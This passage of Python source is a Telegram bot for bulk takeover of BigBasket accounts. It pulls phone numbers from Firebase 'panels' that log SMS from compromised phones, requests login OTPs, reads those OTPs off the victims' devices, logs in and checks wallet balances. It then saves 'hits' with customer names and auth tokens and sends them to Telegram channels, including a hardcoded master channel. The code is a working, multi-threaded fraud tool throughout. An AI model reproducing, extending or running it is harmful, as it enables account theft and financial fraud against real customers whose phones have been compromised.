                m_pnl = re.search(r"(https?://[^\s|,]+)", line)
                pnl = m_pnl.group(1) if m_pnl else fallback_panel
                targets.append({
                    "phone": num,
                    "device": "Scraped Target",
                    "dev_id": did,
                    "panel": resolve_firebase_url(pnl) if pnl else "",
                    "panel_name": pnl,
                    "slot": "Hardware SIM",
                    "is_physical_sim": True
                })

    return targets

# ============ MULTI-THREADED SCAN ENGINE ============
def run_bulk_scan(chat_id: int, targets: List[Dict[str, Any]], scan_title: str = "BigBasket Bulk Scan", resume_data: Optional[Dict[str, Any]] = None):
    with scan_lock:
        if chat_id in active_scans and active_scans[chat_id].get("running"):
            safe_send(chat_id, "⚠️ Ek scan already chal raha hai! Pehle use /stop karein.")
            return

        if resume_data:
            all_targets = resume_data.get("targets", targets)
            proc_phones = set(resume_data.get("processed_phones", []))
            targets_to_run = [t for t in all_targets if t.get("phone") not in proc_phones]
            total = resume_data.get("total", len(all_targets))

            active_scans[chat_id] = {
                "running": True,
                "stop_requested": False,
                "scan_title": resume_data.get("scan_title", scan_title),
                "all_targets": all_targets,
                "total": total,
                "processed": len(proc_phones),
                "processed_phones": list(proc_phones),
                "hits": list(resume_data.get("hits", [])),
                "zero_bal": list(resume_data.get("zero_bal", [])),
                "no_account": list(resume_data.get("no_account", [])),
                "offline": list(resume_data.get("offline", [])),
                "timeout": list(resume_data.get("timeout", [])),
                "failed": list(resume_data.get("failed", [])),
                "start_time": resume_data.get("start_time", time.time()),
            }
            is_resumed = True
        else:
            all_targets = targets
            targets_to_run = targets
            total = len(targets)
            active_scans[chat_id] = {
                "running": True,
                "stop_requested": False,
                "scan_title": scan_title,
                "all_targets": all_targets,
                "total": total,
                "processed": 0,
                "processed_phones": [],
                "hits": [],
                "zero_bal": [],
                "no_account": [],
                "offline": [],
                "timeout": [],
                "failed": [],
                "start_time": time.time(),
            }
            is_resumed = False
            save_scan_state(chat_id)

    with_device = sum(1 for t in targets_to_run if t.get("dev_id") and t.get("panel"))

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Stop Scan & Get Report", callback_data="stop_current_scan"))

    start_msg_text = (
        f"▶️ <b>Resuming {esc(scan_title)}!</b>\n\n"
        f"📋 <b>Remaining to Scan:</b> <code>{len(targets_to_run)}/{total}</code> SIMs\n"
        f"🔥 <b>Existing Hits Preserved:</b> <b>{len(active_scans[chat_id]['hits'])}</b>\n"
        f"🏎️ <b>Concurrency:</b> <b>{MAX_SCAN_WORKERS} Multi-threaded Workers Active</b>\n\n"
        f"⏳ Resuming workers & catching OTPs in parallel..."
    ) if is_resumed else (
        f"🚀 <b>Starting {esc(scan_title)}!</b>\n\n"
        f"📋 <b>Total Targets:</b> <code>{total}</code> Physical SIMs\n"
        f"⚡ <b>Firebase Linked:</b> <code>{with_device}/{total}</code> Numbers\n"
        f"🏎️ <b>Concurrency:</b> <b>{MAX_SCAN_WORKERS} Multi-threaded Workers Active</b>\n\n"
        f"⏳ Initializing workers & sending OTPs in parallel..."
    )

    prog_msg = safe_send(chat_id, start_msg_text, reply_markup=markup)
    prog_id = prog_msg.message_id if prog_msg else None
    last_edit_time = [0.0]
    update_lock = threading.Lock()

    def update_progress_ui(cur_phone: str, cur_dev: str, cur_slot: str):
        with update_lock:
            state = active_scans.get(chat_id)
            if not state or not prog_id:
                return
            now_ts = time.time()
            if now_ts - last_edit_time[0] < 2.5:
                return
            last_edit_time[0] = now_ts

            p_count = state["processed"]
            pct = int((p_count / total) * 100) if total > 0 else 0
            filled = int(pct / 10)
            bar = "█" * filled + "░" * (10 - filled)
            h_count = len(state["hits"])
            zb_count = len(state["zero_bal"])

            status_text = (
                f"🔄 <b>BigBasket Multi-Threaded Scan Running...</b>\n\n"
                f"📊 <b>Progress:</b> <code>[{bar}] {pct}%</code> ({p_count}/{total})\n"
                f"📱 <b>Latest Active:</b> <code>+91 {esc(cur_phone)}</code>\n"
                f"📟 <b>Device:</b> <code>{esc(cur_dev)}</code> ({esc(cur_slot)})\n"
                f"🔥 <b>Hits Found:</b> <b>{h_count}</b> | ℹ️ <b>Zero Bal:</b> <b>{zb_count}</b>\n"
                f"🏎️ <b>Workers:</b> <code>{MAX_SCAN_WORKERS} Parallel Threads</code>\n\n"
                f"⏳ <i>Auto-capturing OTPs from Firebase & checking wallets...</i>"
            )
            safe_edit(chat_id, prog_id, status_text, reply_markup=markup)

    def scan_single_target(item: Dict[str, Any]):
        with scan_lock:
            state = active_scans.get(chat_id)
            if not state or not state.get("running") or state.get("stop_requested"):
                return

        phone = item["phone"]
        did = item.get("dev_id", "")
        fb_url = item.get("panel", "")
        slot = item.get("slot", "SIM 1")
        dev_name = item.get("device", "Unknown Device")

        update_progress_ui(phone, dev_name, slot)

        # 1. Quick check: Is device online? (if linked)
        if fb_url and did:
            clean_url = fb_url.rstrip("/")
            try:
                r_st = requests.get(f"{clean_url}/clients/{did}/status.json", timeout=2)
                if r_st.status_code == 200 and r_st.json() is False:
                    with scan_lock:
                        if chat_id in active_scans:
                            active_scans[chat_id]["offline"].append({"phone": phone, "device": dev_name})
                            active_scans[chat_id]["processed"] += 1
                            active_scans[chat_id]["processed_phones"].append(phone)
                            save_scan_state(chat_id)
                    return
            except Exception:
                pass

        # 2. Fetch pre-existing keys before sending OTP
        known_keys = set()
        if fb_url and did:
            known_keys = fetch_existing_message_keys(fb_url, did)

        # 3. Trigger BigBasket OTP
        bb = BigBasketClient()
        sent_ts = time.time()
        ok_send, ref_or_err = bb.send_otp(phone)

        if not ok_send:
            with scan_lock:
                if chat_id in active_scans:
                    if "does not exist" in ref_or_err.lower() or "inactive" in ref_or_err.lower():
                        active_scans[chat_id]["no_account"].append({"phone": phone, "device": dev_name})
                    else:
                        active_scans[chat_id]["failed"].append({"phone": phone, "reason": ref_or_err, "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        ref_id = ref_or_err
        otp_code = None

        # 4. Auto-catch OTP from Firebase
        stop_fn = lambda: active_scans.get(chat_id, {}).get("stop_requested", False)
        if fb_url and did:
            otp_code = watch_device_otp(fb_url, did, known_keys, sent_ts, timeout_sec=40, stop_checker=stop_fn)

        if not otp_code:
            with scan_lock:
                if chat_id in active_scans:
                    active_scans[chat_id]["timeout"].append({"phone": phone, "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        # 5. Auto-Verify OTP Login
        ok_verify, token_or_err, auth_data = bb.verify(phone, otp_code, ref_id)
        if not ok_verify:
            with scan_lock:
                if chat_id in active_scans:
                    active_scans[chat_id]["failed"].append({"phone": phone, "reason": f"Verify Failed: {token_or_err}", "device": dev_name})
                    active_scans[chat_id]["processed"] += 1
                    active_scans[chat_id]["processed_phones"].append(phone)
                    save_scan_state(chat_id)
            return

        # 6. Check BigBasket Wallet Balance
        w = bb.wallet()
        tb = w.get("total_balance", 0.0) if w else 0.0
        cb = w.get("current_wallet_balance", 0.0) if w else 0.0
        coins = w.get("neucoins", 0) if w else 0
        cust_name = w.get("name") if w and w.get("name") else "BigBasket User"

        hit_record = {
            "phone": phone,
            "total_balance": tb,
            "free_cash": cb,
            "neucoins": coins,
            "name": cust_name,
            "token": bb.token,
            "device": dev_name,
            "dev_id": did,
            "panel": item.get("panel_name") or fb_url,
            "slot": slot,
            "checked_at": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        }

        with scan_lock:
            if chat_id in active_scans:
                active_scans[chat_id]["processed"] += 1
                active_scans[chat_id]["processed_phones"].append(phone)
                if tb > 0 or cb > 0 or coins > 0:
                    active_scans[chat_id]["hits"].append(hit_record)
                else:
                    active_scans[chat_id]["zero_bal"].append(hit_record)
                save_scan_state(chat_id)

        # Instant notification on Hit
        if tb > 0 or cb > 0 or coins > 0:
            hit_card = (
                f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
                f"👤 <b>Customer:</b> <b>{esc(cust_name)}</b>\n"
                f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
                f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
                f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
                f"📟 <b>Device:</b> <code>{esc(dev_name)}</code> ({esc(slot)})\n"
                f"🌐 <b>Panel:</b> <code>{esc(item.get('panel_name') or fb_url)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <i>Saved to report & broadcast to channels!</i>"
            )
            safe_send(chat_id, hit_card)
            broadcast_hit_to_channels(hit_card, chat_id)

    # Launch multi-threaded workers
    with ThreadPoolExecutor(max_workers=MAX_SCAN_WORKERS) as executor:
        futures = [executor.submit(scan_single_target, target) for target in targets_to_run]
        for f in as_completed(futures):
            with scan_lock:
                state = active_scans.get(chat_id)
                if state and state.get("stop_requested"):
                    break

    # ============ FINISHED: COMPILE AND DIRECT DM EXPORT ============
    clear_scan_state(chat_id)
    with scan_lock:
        state = active_scans.pop(chat_id, None)

    if not state:
        return

    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    hits = state.get("hits", [])
    zero_bal = state.get("zero_bal", [])
    no_account = state.get("no_account", [])
    offline = state.get("offline", [])
    timeout = state.get("timeout", [])
    failed = state.get("failed", [])
    total_scanned = len(hits) + len(zero_bal) + len(no_account) + len(offline) + len(timeout) + len(failed)
    total_cash = sum(h.get("total_balance", 0.0) for h in hits)

    hits_file_path = os.path.join(RESULTS_DIR, f"BB_HITS_{chat_id}_{ts_str}.txt")
    with open(hits_file_path, "w", encoding="utf-8") as f:
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write("🛒 BIGBASKET WALLET CHECKER — FINAL HITS REPORT\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"• Generated At:    {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n")
        f.write(f"• Total Processed: {total_scanned}\n")
        f.write(f"• Successful Hits: {len(hits)}\n")
        f.write(f"• Total Cash:      ₹{total_cash:.2f}\n")
        f.write(f"• Zero Balance:    {len(zero_bal)}\n")
        f.write(f"• Unregistered:    {len(no_account)}\n")
        f.write(f"• Offline Devices: {len(offline)}\n")
        f.write(f"• OTP Timeout:     {len(timeout)}\n")
        f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

        if hits:
            for i, h in enumerate(hits, 1):
                f.write(f"⭐ HIT #{i}\n")
                f.write(f"📱 Mobile:        +91 {h['phone']}\n")
                f.write(f"👤 Customer:      {h.get('name', 'N/A')}\n")
                f.write(f"💰 Total Balance: ₹{h.get('total_balance', 0.0):.2f}\n")
                f.write(f"🆓 Free Cash:     ₹{h.get('free_cash', 0.0):.2f}\n")
                f.write(f"🪙 NeuCoins:      {h.get('neucoins', 0)}\n")
                f.write(f"📟 Device:        {h.get('device', 'N/A')} ({h.get('slot', 'SIM')})\n")
                f.write(f"🆔 Dev ID:        {h.get('dev_id', 'N/A')}\n")
                f.write(f"🌐 Panel:         {h.get('panel', 'N/A')}\n")
                f.write(f"🔑 Auth Token:    {h.get('token', '')}\n")
                f.write(f"🕒 Checked At:    {h.get('checked_at', '')}\n")
                f.write("────────────────────────────────────────────────\n\n")
        else:
            f.write("Koi ₹ > 0 balance accounts nahi mile.\n\n")

        if zero_bal:
            f.write("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            f.write(f"ℹ️ ZERO BALANCE ACCOUNTS ({len(zero_bal)})\n")
            f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            for z in zero_bal:
                f.write(f"+91 {z['phone']} | {z.get('name', 'User')} | Bal: ₹0 | Dev: {z.get('device', '')}\n")

    summary_text = (
        f"✅ <b>BigBasket Scan Complete!</b>\n\n"
        f"📊 <b>Total Processed:</b> <code>{total_scanned}</code>\n"
        f"🔥 <b>Hits Found (&gt; ₹0):</b> <b>{len(hits)}</b>\n"
        f"💰 <b>Total Cash Extracted:</b> <b>₹{total_cash:.2f}</b>\n"
        f"ℹ️ <b>Zero Balance Accounts:</b> <code>{len(zero_bal)}</code>\n"
        f"👤 <b>Unregistered on BB:</b> <code>{len(no_account)}</code>\n"
        f"📵 <b>Offline Devices:</b> <code>{len(offline)}</code>\n"
        f"⏳ <b>OTP Timeout:</b> <code>{len(timeout)}</code>\n\n"
        f"📥 <i>Aapki hits .txt file direct niche DM me bhej di gayi hai:</i>"
    )
    safe_send(chat_id, summary_text)

    # Send document to user DM
    try:
        with open(hits_file_path, "rb") as doc:
            bot.send_document(
                chat_id,
                doc,
                caption=f"📄 <b>BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash",
                parse_mode="HTML"
            )
    except Exception as e:
        safe_send(chat_id, f"⚠️ Document delivery error: {esc(e)}")

    # Send document to storage channel AND Master Universal Channel
    destinations = set()
    storage_ch = get_effective_storage_channel(chat_id)
    if storage_ch:
        destinations.add(storage_ch)
    master_ch = MASTER_CHANNEL_ID or DEFAULT_STORAGE_CHANNEL or "-1003626087056"
    if master_ch:
        destinations.add(master_ch)

    for dest in destinations:
        try:
            with open(hits_file_path, "rb") as doc:
                bot.send_document(
                    int(dest) if str(dest).lstrip("-").isdigit() else dest,
                    doc,
                    caption=f"📦 <b>[Universal Backup] BB_HITS_{ts_str}.txt</b>\n🔥 {len(hits)} Hits | ₹{total_cash:.2f} Total Cash"
                )
        except Exception:
            pass

    # Show menu again
    show_scanner_menu(chat_id)

def do_panel_scan(chat_id: int, raw_panel: str):
    fb_url = resolve_firebase_url(raw_panel)
    if not fb_url:
        safe_send(chat_id, "❌ Invalid Firebase URL!")
        return

    with cfg_lock:
        if chat_id not in user_panels:
            user_panels[chat_id] = []
        if raw_panel not in user_panels[chat_id]:
            user_panels[chat_id].append(raw_panel)
            save_configs()

    sync_panels_to_master([raw_panel], chat_id)

    safe_send(
        chat_id,
        f"🔍 <b>Connecting to Panel:</b> <code>{esc(raw_panel)}</code>\n"
        f"⚡ Fast-probing live online devices across panel database..."
    )

    def worker():
        try:
            online_targets, all_count, err = harvest_panel_online_targets(raw_panel)

            if err and not all_count:
                safe_send(chat_id, f"❌ Panel <code>{esc(raw_panel)}</code> par devices nahi mile ya database locked hai.")
                return

            if not online_targets:
                safe_send(
                    chat_id,
                    f"⚠️ Panel par <b>{all_count}</b> devices mile, par koi active SIM target nahi mila.\n"
                    f"Thodi der baad dobara koshish karein."
                )
                return

            safe_send(
                chat_id,
                f"✅ <b>Harvested {len(online_targets)} Physical SIMs across {all_count} Devices!</b>\n"
                f"🟢 <b>Status:</b> All targets belong to <b>Active Online Devices</b> right now.\n"
                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers..."
            )

            run_bulk_scan(chat_id, online_targets, f"Direct Panel ({raw_panel})")

        except Exception as e:
            safe_send(chat_id, f"❌ Error during panel audit: {esc(e)}")

    threading.Thread(target=worker, daemon=True).start()

def do_scan_all_panels(chat_id: int):
    with cfg_lock:
        panels = list(user_panels.get(chat_id, []))

    if not panels:
        safe_send(chat_id, "ℹ️ Scan karne ke liye koi panels saved nahi hain. Pehle Panels Hub me panel add karein.")
        show_panels_menu(chat_id)
        return

    safe_send(
        chat_id,
        f"🌐 <b>Probing {len(panels)} Panels in Parallel...</b>\n"
        f"⚡ Fast-harvesting <b>LIVE ONLINE</b> devices across all databases..."
    )

    def worker():
        try:
            all_targets = []
            seen_nums = set()
            total_devs = 0

            with ThreadPoolExecutor(max_workers=min(len(panels), 8)) as executor:
                futures = {executor.submit(harvest_panel_online_targets, p): p for p in panels}
                for f in as_completed(futures):
                    try:
                        targets, count, err = f.result()
                        total_devs += count
                        for t in targets:
                            if t["phone"] not in seen_nums:
                                seen_nums.add(t["phone"])
                                all_targets.append(t)
                    except Exception:
                        pass

            if not all_targets:
                safe_send(
                    chat_id,
                    f"⚠️ <b>{len(panels)}</b> panels me kul <b>{total_devs}</b> devices mile, par abhi koi active SIM online nahi mila.\n"
                    f"Thodi der baad dobara koshish karein."
                )
                return

            safe_send(
                chat_id,
                f"✅ <b>Harvested {len(all_targets)} Physical SIMs across {len(panels)} Panels!</b>\n"
                f"🟢 <b>Status:</b> All targets belong to <b>LIVE Online Devices</b> right now.\n"
                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent BigBasket scan workers..."
            )

            run_bulk_scan(chat_id, all_targets, f"All Saved Panels ({len(panels)} Panels)")

        except Exception as e:
            safe_send(chat_id, f"❌ Error during multi-panel audit: {esc(e)}")

    threading.Thread(target=worker, daemon=True).start()

# ============ JIO-BOT INTERACTIVE INLINE HUBS ============
def show_main_menu(chat_id: int, message_id: Optional[int] = None):
    with cfg_lock:
        panels = user_panels.get(chat_id, [])
    log_ch = get_effective_log_channel(chat_id)
    storage_ch = get_effective_storage_channel(chat_id)

    is_scanning = chat_id in active_scans and active_scans[chat_id].get("running")
    status_emoji = "🟢 RUNNING" if is_scanning else "⚪ IDLE"
    role_str = "👑 Super Admin" if chat_id == SUPER_ADMIN_ID else ("🛡️ Admin" if chat_id in ADMIN_USER_IDS else "👤 User")

    text = f"""🤖 <b>BigBasket Enterprise Scanner Bot (24/7 Cloud)</b>

🆔 <b>User ID:</b> <code>{chat_id}</code> | 🔒 <b>Role:</b> {role_str}
⚡ <b>Scanner Engine:</b> <b>{status_emoji}</b>
📂 <b>Panels Loaded:</b> <code>{len(panels)} Panels</code>
📡 <b>Log Channel:</b> <code>{esc(log_ch)}</code>
📦 <b>Storage Channel:</b> <code>{esc(storage_ch)}</code>
🌐 <b>Master Channel:</b> <code>{esc(MASTER_CHANNEL_ID)}</code>

<i>Select a category below to access controls:</i>"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚡ Scanner Hub", callback_data="menu_scanner"),
        types.InlineKeyboardButton("📂 Panels & Data", callback_data="menu_panels")
    )
    markup.add(
        types.InlineKeyboardButton("📡 Channels & Logs", callback_data="menu_channels"),
        types.InlineKeyboardButton("📥 Export Hub", callback_data="menu_export")
    )
    markup.add(
        types.InlineKeyboardButton("📱 Check Single Number", callback_data="menu_single"),
        types.InlineKeyboardButton("❓ Help & User Guide", callback_data="menu_help")
    )

    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_scanner_menu(chat_id: int, message_id: Optional[int] = None):
    with cfg_lock:
        panels = user_panels.get(chat_id, [])

    is_scanning = chat_id in active_scans and active_scans[chat_id].get("running")
    session = active_scans.get(chat_id)
    saved = get_saved_scan_state(chat_id)

    state_str = "🟢 <b>Scanning Active</b>" if is_scanning else "⚪ <b>Idle / Stopped</b>"

    if is_scanning and session:
        h_cnt = len(session.get("hits", []))
        zb_cnt = len(session.get("zero_bal", []))
        processed = session.get("processed", 0)
        total = session.get("total", 0)
    elif saved:
        h_cnt = len(saved.get("hits", []))
        zb_cnt = len(saved.get("zero_bal", []))
        processed = len(saved.get("processed_phones", []))
        total = saved.get("total", 0)
    else:
        h_cnt = 0
        zb_cnt = 0
        processed = 0
        total = 0

    log_ch = get_effective_log_channel(chat_id)
    storage_ch = get_effective_storage_channel(chat_id)

    text = f"""⚡ <b>Scanner Control Hub</b>

• <b>Status:</b> {state_str}
• <b>Panels Loaded:</b> <code>{len(panels)}</code>
• <b>Parallel Workers:</b> <code>{MAX_SCAN_WORKERS} Threads Active</code>
• <b>Progress:</b> <code>{processed}/{total}</code>
• <b>Hits Found:</b> <b>{h_cnt}</b> | <b>Zero Bal:</b> <b>{zb_cnt}</b>
• <b>Log Channel:</b> <code>{esc(log_ch)}</code>
• <b>Storage Channel:</b> <code>{esc(storage_ch)}</code>

<i>Use the buttons below to control the scanner:</i>"""

    markup = types.InlineKeyboardMarkup()
    if is_scanning:
        markup.add(
            types.InlineKeyboardButton("🛑 Stop Current Scan", callback_data="stop_current_scan"),
            types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn")
        )
    elif saved:
        rem_cnt = max(0, total - processed)
        markup.add(types.InlineKeyboardButton(f"⏯️ Continue Previous Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"))
        markup.add(
            types.InlineKeyboardButton("🔄 Run New Scan", callback_data="scan_all_panels"),
            types.InlineKeyboardButton("🗑️ Discard Old Scan", callback_data="discard_saved_scan")
        )
        markup.add(types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn"))
    else:
        markup.add(
            types.InlineKeyboardButton("🌐 Scan All Panels", callback_data="scan_all_panels"),
            types.InlineKeyboardButton("📁 Upload Scraped File", callback_data="upload_prompt")
        )
        markup.add(types.InlineKeyboardButton("📈 Live Status", callback_data="status_btn"))

    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_panels_menu(chat_id: int, message_id: Optional[int] = None):
    with cfg_lock:
        panels = user_panels.get(chat_id, [])
        master_cnt = len(user_panels.get(SUPER_ADMIN_ID, []))

    total_count = len(panels)
    preview_lines = []
    for p in panels[:4]:
        p_clean = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")
        preview_lines.append(f"• <code>{esc(p_clean)}</code>")

    preview = "\n".join(preview_lines) if preview_lines else "<i>No panels added yet.</i>"
    if total_count > 4:
        preview += f"\n<i>... and {total_count - 4} more panels</i>"

    is_admin = (chat_id == SUPER_ADMIN_ID or chat_id in ADMIN_USER_IDS)
    admin_info = f"\n👑 <b>Master Pool:</b> <code>{master_cnt} Total Panels</code> (All users synced)" if is_admin else ""

    text = f"""📂 <b>Panels & Data Workspace</b>

• <b>Panels Loaded:</b> <code>{total_count}</code>
• <b>Storage Backup:</b> <code>{esc(get_effective_storage_channel(chat_id))}</code>{admin_info}

<b>Saved Panels Preview:</b>
{preview}

💡 <b>Tip:</b> You can paste Firebase URLs directly in chat anytime to merge into your workspace!"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("➕ Add Panels", callback_data="add_panel_prompt"),
        types.InlineKeyboardButton("📋 View All Panels", callback_data="view_panels_list")
    )
    markup.add(
        types.InlineKeyboardButton("🧪 Health Ping", callback_data="ping_panels"),
        types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels")
    )
    markup.add(
        types.InlineKeyboardButton("📥 Export Panels (.txt)", callback_data="export_panels_txt"),
        types.InlineKeyboardButton("🗑️ Clear All Panels", callback_data="clear_panels_prompt")
    )
    if is_admin:
        markup.add(
            types.InlineKeyboardButton("👑 Export Master Pool (.txt)", callback_data="export_master_pool")
        )
    markup.add(
        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
    )

    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_channels_menu(chat_id: int, message_id: Optional[int] = None):
    log_ch = get_effective_log_channel(chat_id)
    storage_ch = get_effective_storage_channel(chat_id)

    text = f"""📡 <b>Channel Connections & Storage Hub</b>

• <b>Your Log Channel:</b> <code>{esc(log_ch)}</code>
• <b>Your Storage Channel:</b> <code>{esc(storage_ch)}</code>

<b>Channel Functionality:</b>
• <b>Log Channel:</b> Instant Hit cards with customer details, balance & tokens are posted live.
• <b>Storage Channel:</b> Complete .txt backup reports are archived automatically at scan finish.

💡 <i>To link a private channel, make this bot an Admin in your channel and send the Channel ID (e.g. -100xxxxxxxxxx).</i>"""

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📢 Set Log Channel", callback_data="set_log_prompt"),
        types.InlineKeyboardButton("📦 Set Storage Channel", callback_data="set_storage_prompt")
    )
    markup.add(
        types.InlineKeyboardButton("🧪 Test Log Ping", callback_data="test_log_ping"),
        types.InlineKeyboardButton("📦 Test Storage Ping", callback_data="test_storage_ping")
    )
    markup.add(
        types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu")
    )

    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_export_menu(chat_id: int, message_id: Optional[int] = None):
    files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
    if not files:
        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
    files.sort(reverse=True)

    file_count = len(files)
    latest_file = files[0] if files else "None"

    text = f"""📥 <b>Results & Export Hub</b>

• <b>Total Saved Reports:</b> <code>{file_count}</code>
• <b>Latest File:</b> <code>{esc(latest_file)}</code>

<i>Click below to download your latest hits report file directly into this chat:</i>"""

    markup = types.InlineKeyboardMarkup()
    if files:
        markup.add(types.InlineKeyboardButton("📄 Download Latest Hits (.txt)", callback_data="export_latest_hits"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))

    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_single_menu(chat_id: int, message_id: Optional[int] = None):
    with session_lock:
        user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}

    text = """📱 <b>Single Number Wallet Checker</b>

📲 <b>Kripya 10-digit Indian Mobile Number enter karein:</b>
(e.g. <code>9899123456</code>)

Bot BigBasket API se OTP send karega aur login karke Total Balance, Free Cash aur NeuCoins nikalega."""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))

    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

def show_help_menu(chat_id: int, message_id: Optional[int] = None):
    text = """📖 <b>BigBasket Scanner User Guide:</b>

<b>🔹 1. Panel Manager:</b>
• Firebase URLs chat me paste karein ya <b>➕ Add Panels</b> dabayein.
• <b>🌐 Scan All Panels</b> dabane par bot har panel se active online devices nikal kar parallel OTP check chala dega.

<b>🔹 2. File Upload (Dashboard Bridge):</b>
• Red Glass Dashboard se <code>clean_numbers_*.txt</code> ya <code>.csv</code> send karein.
• Bot Phone, Device ID aur Panel mapping detect karke auto scan karega.

<b>🔹 3. 24/7 Cloud Keep-Alive:</b>
• Bot Render free cloud par 24/7 host rehta hai.
• Agar scan beech me ruk jaye to <b>⏯️ Continue Previous Scan</b> se usi point se resume ho jata hai.

<b>Commands:</b>
• <code>/start</code> — Main Menu
• <code>/panels</code> — Panels Workspace
• <code>/channel</code> — Channels & Storage Settings
• <code>/stop</code> — Running scan stop karein
• <code>/status</code> — Live Scanner Status"""

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="start_menu"))
    send_or_edit(chat_id, text, reply_markup=markup, message_id=message_id)

# ============ SINGLE NUMBER CHECK FLOW ============
def start_single_flow(chat_id: int, raw_number: str):
    phone = normalize_phone(raw_number)
    if not phone:
        safe_send(chat_id, "❌ <b>Invalid Mobile Number!</b> 10-digit Indian number enter karein.")
        show_single_menu(chat_id)
        return

    safe_send(chat_id, f"🔄 <b>Connecting to BigBasket...</b>\nSending OTP to <code>+91 {esc(phone)}</code>...")

    def do_send():
        bb = BigBasketClient()
        ok_send, ref_or_err = bb.send_otp(phone)
        if not ok_send:
            safe_send(chat_id, f"❌ <b>OTP Send Failed:</b> {esc(ref_or_err)}")
            with session_lock:
                user_sessions.pop(chat_id, None)
            show_main_menu(chat_id)
            return

        with session_lock:
            user_sessions[chat_id] = {
                "state": "AWAITING_OTP",
                "phone": phone,
                "ref_id": ref_or_err,
                "client": bb,
                "sent_time": time.time()
            }

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))

        safe_send(
            chat_id,
            f"✅ <b>OTP Sent Successfully!</b>\n\n"
            f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
            f"🔑 <b>Ref ID:</b> <code>{esc(ref_or_err)}</code>\n\n"
            f"👉 Kripya 6-digit OTP reply me bhejein (Valid for 3 mins):",
            reply_markup=markup
        )

    threading.Thread(target=do_send, daemon=True).start()

# ============ COMMAND HANDLERS ============
@bot.message_handler(commands=["start"])
def cmd_start(message):
    chat_id = message.chat.id
    register_user(chat_id)
    with session_lock:
        user_sessions.pop(chat_id, None)

    saved = get_saved_scan_state(chat_id)
    if saved and (chat_id not in active_scans or not active_scans[chat_id].get("running")):
        proc_cnt = len(saved.get("processed_phones", []))
        tot_cnt = saved.get("total", len(saved.get("targets", [])))
        rem_cnt = max(0, tot_cnt - proc_cnt)
        hits_cnt = len(saved.get("hits", []))

        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton(f"▶️ Resume Scan ({rem_cnt} Left)", callback_data="resume_saved_scan"),
            types.InlineKeyboardButton("🗑️ Discard & Reset", callback_data="discard_saved_scan")
        )
        safe_send(
            chat_id,
            f"⚠️ <b>Interrupted Scan Recovered!</b>\n\n"
            f"📋 <b>Title:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>\n"
            f"📊 <b>Progress:</b> <code>{proc_cnt}/{tot_cnt}</code> SIMs checked\n"
            f"🔥 <b>Existing Hits:</b> <b>{hits_cnt}</b>\n"
            f"⏳ <b>Remaining:</b> <b>{rem_cnt} SIMs</b>\n\n"
            f"Scan ko wahi se continue karein jaha yeh stop hua tha:",
            reply_markup=markup
        )

    show_main_menu(chat_id)

@bot.message_handler(commands=["panels"])
def cmd_panels(message):
    register_user(message.chat.id)
    show_panels_menu(message.chat.id)

